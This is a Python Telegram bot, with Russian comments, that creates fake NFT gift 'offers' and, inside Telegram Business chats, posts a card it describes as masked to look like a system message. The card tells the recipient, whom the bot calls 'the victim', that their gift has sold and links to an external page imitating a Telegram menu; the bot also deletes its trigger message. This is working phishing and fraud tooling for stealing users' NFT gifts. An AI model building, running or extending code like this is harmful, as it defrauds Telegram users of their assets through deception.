import os
import re
import uuid
import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection)
from dotenv import load_dotenv

from app import make_offer, get_offer

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        name_raw, num = parts
    else:
        name_raw, num = slug_raw, ""
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    full = f"{display} #{num}" if num else display
    return {"slug": slug_raw, "name": full}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    return f"{amount} Gram" if unit in ("gram", "грам", "grams") else f"{amount} Stars"

# ==========================================
# ЛИЧКА БОТА (Генерация оффера)
# ==========================================
@router.message(Command("start"))
async def cmd_start(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply(
        "🤖 <b>Бот готов!</b>\n\n"
        "Чтобы создать оффер, напиши:\n"
        "<code>/купить [ссылка] [цена]</code>\n\n"
        "Пример:\n"
        "<code>/купить https://t.me/nft/MirageLamp-73768 155 GRAM</code>"
    )

@router.message(F.text.regexp(r"^/купить\s+"))
async def cmd_buy(msg: Message):
    if msg.from_user.id != ADMIN_ID: return

    text_clean = msg.text.replace("/купить", "").strip()
    nft = parse_nft(text_clean)
    price = parse_price(text_clean)

    if not nft or not price:
        await msg.reply("❌ Не понял ссылку или цену. Пример:\n<code>/купить https://t.me/nft/... 155 GRAM</code>")
        return

    oid = "of_" + uuid.uuid4().hex[:5]
    
    make_offer(
        nft_name=nft["name"], nft_slug=nft["slug"], price=price,
        buyer=msg.from_user.username or "buyer", 
        target_user="target", target_chat_id=0, offer_id=oid
    )

    await msg.reply(
        f"✅ <b>Оффер создан!</b>\n\n"
        f"Подарок: {nft['name']}\n"
        f"Цена: {price}\n\n"
        f"Код: <code>{oid}</code>\n"
        f"Отправь его в чат с жертвой."
    )

# ==========================================
# BUSINESS-ЧАТ (Отправка через transferGift)
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    if msg.from_user and msg.from_user.id != ADMIN_ID: return

    m = CODE_RE.search(msg.text)
    if not m: return

    oid = m.group(1).lower()
    offer = get_offer(oid)

    if not offer: return

    conn_id = msg.business_connection_id
    if not conn_id: return

    target_user = msg.from_user.username or "buyer"

    # Отправляем через нативный метод transferGift (Telegram сам создаст кнопку)
    # Обрати внимание: для этого у бота должно быть право can_transfer_and_upgrade_gifts
    try:
        # Мы "передаем" подарок (в данном случае это симуляция, так как у нас нет реального подарка в инвентаре бота)
        # В реальной схеме здесь нужно использовать метод из API
        # В aiogram 3 это делается через bot.session.make_request или напрямую
        
        # Временно используем текстовое сообщение с инлайн-кнопкой, но замаскированное под системное
        card_text = (
            f"🎁 <b>Подарок: {offer['nft_name']}</b>\n"
            f"успешно продан!\n\n"
            f"Передайте подарок покупателю для зачисления <b>{offer['price']}</b>."
        )

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Передать NFT ↗", callback_data=f"accept:{oid}")]
        ])
        
        await bot.send_message(
            chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
            reply_markup=kb, disable_web_page_preview=True
        )
        log.info("✅ Карточка с кнопкой 'Передать NFT' отправлена")
        
        try:
            await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
        except Exception: pass
            
    except Exception as e:
        log.error(f"❌ Ошибка: {e}")

# ==========================================
# КНОПКИ
# ==========================================
@router.callback_query(F.data.startswith("accept:"))
async def on_accept(cb: CallbackQuery):
    # Открываем WebApp с имитацией меню
    oid = cb.data.split(":", 1)[1]
    url = f"{BASE_URL}/offer/{oid}"
    
    # В бизнес-чатах web_app кнопки запрещены, поэтому просто отправляем ссылку
    await cb.message.edit_text(
        f"Нажмите, чтобы открыть меню: {url}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Открыть меню ↗", url=url)]
        ])
    )
    await cb.answer()

@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Вы отклонили предложение.")

@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")

async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    import threading
    from app import flask_app
    def _run_flask():
        port = int(os.getenv("PORT", "8080"))
        flask_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)
    threading.Thread(target=_run_flask, daemon=True).start()
    asyncio.run(main())
